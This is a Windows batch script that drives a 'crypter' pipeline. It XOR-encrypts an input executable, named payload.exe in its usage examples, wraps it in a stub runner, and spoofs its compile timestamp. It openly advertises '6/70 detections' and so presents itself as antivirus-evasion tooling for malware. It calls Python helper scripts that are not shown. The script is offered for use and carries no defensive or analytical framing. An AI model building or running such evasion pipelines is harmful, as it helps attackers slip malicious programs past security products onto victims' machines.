@echo off
REM XOR-Encrypt Complete Pipeline
REM Uses existing working tools: xorcrypt_advanced.py + metadata_spoof.py

if "%~1"=="" (
    echo Usage: xorcrypt.bat input.exe output.exe [password] [year]
    echo.
    echo Examples:
    echo   xorcrypt.bat payload.exe final.exe
    echo   xorcrypt.bat payload.exe final.exe MyPass123 2015
    echo.
    echo Best Result: 6/70 detections
    exit /b 1
)

set INPUT=%~1
set OUTPUT=%~2
set PASSWORD=%~3
set YEAR=%~4

if "%PASSWORD%"=="" set PASSWORD=SecureKey2026!
if "%YEAR%"=="" set YEAR=2018

echo ============================================
echo XOR-Encrypt Complete Pipeline
echo ============================================
echo Input:    %INPUT%
echo Output:   %OUTPUT%
echo Password: %PASSWORD%
echo Year:     %YEAR%
echo ============================================
echo.

REM Step 1: Encrypt
echo [1/3] Encrypting with Level 6...
python xorcrypt_advanced.py encrypt "%INPUT%" temp_encrypted.bin --password "%PASSWORD%" --level 6
if errorlevel 1 (
    echo [!] Encryption failed
    exit /b 1
)

REM Step 2: Generate stub
echo [2/3] Generating stub runner...
python xorcrypt_advanced.py stub temp_encrypted.bin temp_output.exe --password "%PASSWORD%" --level 6
if errorlevel 1 (
    echo [!] Stub generation failed
    del temp_encrypted.bin
    exit /b 1
)

REM Step 3: Spoof timestamp
echo [3/3] Spoofing timestamp to %YEAR%...
python metadata_spoof.py temp_output.exe "%OUTPUT%" %YEAR%
if errorlevel 1 (
    echo [!] Timestamp spoofing failed
    copy temp_output.exe "%OUTPUT%"
)

REM Cleanup
del temp_encrypted.bin 2>nul
del temp_output.exe 2>nul

echo.
echo ============================================
echo [+] Complete!
echo ============================================
echo Output: %OUTPUT%
dir "%OUTPUT%" | find "%OUTPUT%"
echo.
echo Expected: 6/70 detections (8.5%%)
echo ============================================
